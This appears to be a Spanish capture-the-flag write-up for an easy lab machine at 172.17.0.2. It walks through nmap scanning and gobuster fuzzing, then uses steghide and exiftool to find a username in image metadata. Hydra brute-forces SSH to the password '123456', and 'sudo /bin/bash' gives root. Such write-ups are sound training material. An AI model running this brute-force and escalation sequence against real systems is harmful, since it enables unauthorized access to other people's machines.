tags:  #muy-facil #fuzzing #ssh #hydra #exiftool 
_______________________
Comenzamos la máquina haciendo un escaneo completo de puertos, versiones y vulnerabilidades con nmap:

```bash
nmap -sCVS -p- --open --min-rate 5000 -n -Pn -oN scan -vvv 172.17.0.2
```

![[Pasted image 20251009140430.png]]

Vemos que tenemos un servicio web activo, así que vamos a echar un vistazo:

![[Anexos/Pasted image 20251009140528.png]]

Nada que nos indique pistas sobre nombres de usuario o cualquier otra cosa. Probamos hacer fuzzing con gobuster:

```bash
obuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.xml,.txt,.html -t 10 -o dirs.txt
```

![[Pasted image 20251009140954.png]]

No encontramos nada.  Nos descargamos la foto y ejecutamos el siguiente comando para extraer información oculta:

```bash
steghide extract -sf imagen.jpeg
```

![[Anexos/Pasted image 20251009143011.png]]

Probamos usar la herramienta dexiftool para analizar la imagen, y obtenemos lo siguiente:

```bash
exiftool imagen.jpeg
```

![[Pasted image 20251009143339.png]]

Como podemos ver, en el campo Description nos proporciona un nombre de usuario, así que haremos fuerza bruta con hydra en el servicio ssh para intentar acceder como el usuario borazuwarah:

```bash
hydra -l borazuwarah -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -I ssh://172.17.0.2
```

![[Pasted image 20251009143815.png]]

Rápidamente nos arroja la contraseña: 123456

Ahora nos conectamos por ssh con el usuario para ver que nos encontramos:

```bash
ssh borazuwarah@172.17.0.2
```

![[Anexos/Pasted image 20251009144102.png]]

Ya somos el usuario borazuwarah. Ahora, al ejecutar **sudo -l*** vemos lo siguiente:

![[Pasted image 20251009144159.png]]

Así que, si ejecutamos **sudo /bin/bash** deberíamos tener acceso

![[Anexos/Pasted image 20251009144259.png]]

Y somos root!
